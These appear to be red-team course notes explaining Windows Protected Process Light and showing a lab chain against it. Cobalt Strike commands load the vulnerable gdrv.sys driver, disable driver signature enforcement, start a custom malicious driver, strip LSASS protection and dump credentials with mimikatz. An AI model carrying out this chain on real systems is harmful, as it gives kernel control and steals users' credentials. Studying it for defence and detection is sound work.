Protected Process (PP) and Protected Process Light (PPL) is a relatively new mechanism on windows which was first designed as protection for DRM. It worked fundamentally by limiting the access you could obtain to a protected process, such as PROCESS_QUERY_LIMITED_INFORMATION or PROCESS_TERMINATE, but not PROCESS_VM_READ or anything else that would allow you to circumvent the DRM requirements. 

The technology has been expanded to help protect other windows processes - notably LSAA and AV engines. This is not enforced by AV or EDR protection but by the windows kernel. You may think of it as an improved ASR, but the same bypasses will not work here. [PPEnum](https://github.com/rasta-mouse/PPEnum) BOF shows that LSASS is a PPL with a signer level of Lsa.

The [documented](https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess) \_PS_PROTECTED_SIGNER struct provides a view of the possible signers that can be used.  Because of the various moving parts, there is an order of protection precedence that the kernel considers.  PP always trumps PPL, so a PPL can never obtain full access to a PP regardless of its signer.  A PP can gain full access to another PP or PPL if the signer is equal or greater; and a PPL can gain full access to another PPL if the signer is equal or greater.

Userland PPL bypasses come and go, some of the most w3ell known like [PPLDump](https://github.com/itm4n/PPLdump) However, a guaranteed way to get around PPL is with a driver. There are several projects that can do this such as [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller), [mimidrv](https://github.com/gentilkiwi/mimikatz/tree/master/mimidrv) or you can write a [custom driver](https://training.zeropointsecurity.co.uk/courses/offensive-driver-development). Elevating from a local admin into the kernel is not a security boundary, so this is not seen as a serviceable vulnerability by microsoft. 

However you cannot load drivers taht are not legitimately signed unless windows test signing mode is enabled. For example, using an admin session workstation 2, upload our malicious driver. *Note* this is the driver written in the offensive driver development course. To run the driver, create and start a kernel-mode service.  However, we'll see that it won't run.

```
getuid
cd C:\Windows\System32\drivers
upload C:\Tools\RedOctober\RedOctober.sys
run sc create redoct type= kernel binPath= C:\Windows\System32\drivers\RedOctober.sys 
run sc start redoct
```

In order to load this driver, we need to bypass driver signature enforcement (DSE) first, for which we need an arbitrary kernel memory write primitive. A common way to do this is by 1. loading a known vulnerable, yet legitimately signed driver, 2. use it to disable DSE, 3. load the malicious driver, 4. then re-enable DSE. The [LOLDrivers](https://www.loldrivers.io/) project contains a massive collection of drivers that could be used for this purpose.  In this module, we'll use an old GIGABYTE driver, gdrv.sys.

Step 1. uploading and creating a kernel service for the malicious driver
```
upload C:\Tools\cobaltstrike\gdrv\gdrv.sys
run sc create gdrv type= kernel binPath= C:\Windows\System32\drivers\gdrv.sys
run sc start gdrv
```

Step 2. disabling dse with a BOF script called disable_dse and enable_dse:
```
disable_dse
```

Step 3. Start the driver with dse disabled:
```
run start redoct
```

Step 4. Re-enable dse so we don't blue screen the machine
```
enable_dse
```

Then we can unload and remove the driver from the system:
```
run sc stop gdrv
run sc delete gdrv
rm gdrv.sys
```

## Dumping LSASS

Because protected processes are hierarchical, there are two ways to tackle this.

1. Remove the protection level from LSASS.
2. Elevate the protection level of a process we control to be greater than LSASS.

Because mimikatz is fork and run it's a little easier to just remove the protection from LSASS. As with the GIGABYTE driver, there is a BOF and aggressor script to call the correct IOCTL from the RedOctober driver, the command is simply `unprotect_process \<pid>`

```
ppenum 652
unprotect_process 652
ppenum 652
```

With the protection on LSASS disabled, Mimikatz can work its magic.

```
mimikatz !sekurlsa::logonpasswords
```